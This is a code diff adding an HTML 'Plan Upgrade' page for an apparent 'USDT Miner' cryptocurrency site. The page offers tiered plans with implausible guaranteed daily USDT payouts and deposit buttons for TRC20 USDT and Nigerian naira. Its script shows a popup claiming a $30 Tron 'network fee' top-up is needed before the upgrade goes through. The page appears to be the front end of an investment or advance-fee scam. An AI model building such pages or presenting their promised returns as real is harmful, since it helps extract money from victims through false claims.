@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <script src="https://kit.fontawesome.com/32bbba991c.js" crossorigin="anonymous"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&family=Quicksand:wght@500&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+    <title>USDT Miner</title>
+    <style>
+        * {
+            margin: 0 auto;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+            font-family: 'Quicksand', sans-serif;
+            font-size: 14px;
+        }
+        .container {
+            max-width: 500px;
+        }
+        .head {
+            text-align: center;
+        }
+        #logo {
+            width: 40px;
+            margin: 20px;
+        }
+        .action b {
+            font-size: 24px;
+        }
+        .action h3 {
+            text-align: center;
+        }
+        .action hr {
+            margin: 20px;
+        }
+        .d {
+            background-color: #e8e8e8;
+            padding: 10px;
+            margin: 10px;
+            border-radius: 10px;
+        }
+        span {
+            float: right;
+        }
+        .d h3 {
+            margin-bottom: 10px;
+            margin-top: 10px;
+        }
+        .wi {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            width: 80%;
+        }
+        .wi button {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 10px;
+            padding: 10px;
+            border-style: dotted;
+            outline: none;
+            background-color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            color: #49b5ab;
+        }
+        .wi button:hover {
+            background-color: #49b5ab;
+            color: #fff;
+            transition: background-color 0.3s ease;
+        }
+        #usdtInput {
+            font-size: 12px;
+        }
+        #status {
+            color: red;
+        }
+        .fa-circle-exclamation {
+            color: red;
+        }
+        .d button {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 10px;
+            padding: 10px;
+            border-style: dotted;
+            outline: none;
+            background-color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            color: #49b5ab;
+        }
+        .d button:hover {
+            background-color: #49b5ab;
+            color: #fff;
+            transition: background-color 0.3s ease;
+        }
+        .ddd {
+            margin-top: 10px;
+        }
+        .cnn {
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="cnn">
+            <h3>Plan Upgrade</h3>
+            <p>Want to upgrade your mining plan? This is the exclusive plan for you:</p>
+        </div>
+        <div class="d">
+            <h3>1.05%: <span>Tier 1</span></h3>
+            <h3>Period: <span>Daily/365*4 days</span></h3>
+            <h3>Amount/24hrs: <span>1 USDT</span></h3>
+            <h3>Price: <span>Free</span></h3>
+            <div class="ddd">
+                <button onclick="location.href ='index.html'">Your Current Plan</button>
+            </div>
+        </div>
+        <div class="d">
+            <h3>5.50%: <span>Tier 2</span></h3>
+            <h3>Period: <span>Daily/30 days</span></h3>
+            <h3>Amount/24hrs: <span>50 USDT</span></h3>
+            <h3>Price: <span> ₦15.235.00</span></h3>
+            <div class="ddd">
+                <button onclick="location.href ='deposit1.html'">Top Up USDT (Trc20)</button>
+            </div>
+            <div class="ddd">
+                <button onclick="location.href ='deposit11.html'">Top Up NAIRA (NGN)</button>
+            </div>
+        </div>
+         <div class="d">
+            <h3>9.00%: <span>Tier 3</span></h3>
+            <h3>Period: <span>Daily/30 days</span></h3>
+            <h3>Amount/24hrs: <span>100 USDT</span></h3>
+            <h3>Price: <span>30,470.00</span></h3>
+            <div class="ddd">
+                <button onclick="location.href ='deposit2.html'">Top Up USDT (Trc20)</button>
+            </div>
+            <div class="ddd">
+                <button onclick="location.href ='deposit22.html'">Top Up NAIRA (NGN)</button>
+            </div>
+    </div>
+     <div class="d">
+            <h3>15.90%: <span>Marchant</span></h3>
+            <h3>Period: <span>Daily/30 days</span></h3>
+            <h3>Amount/24hrs: <span>1x500 USDT</span></h3>
+            <h3>Price: <span>50,690.00</span></h3>
+            <div class="ddd">
+                <button onclick="location.href ='deposit3.html'">Top Up USDT (Trc20)</button>
+            </div>
+            <div class="ddd">
+                <button onclick="location.href ='deposit33.html'">Top Up NAIRA (NGN)</button>
+            </div>
+    </div>
+    <script>
+        function showToggle() {
+            const networkFeeMessage = "Your current Tron balance is 0.00 TRC and $30.00 (TRC) is needed to confirm this upgrade. Kindly top-up USDT to proceed.";
+            Swal.fire({
+                title: 'Upgrade Information',
+                text: networkFeeMessage,
+                icon: 'info',
+                confirmButtonText: 'Got it!',
+                iconColor: '#49b5ab',
+                confirmButtonColor: '#49b5ab'
+            });
+        }
+    </script>
+</body>
+</html>
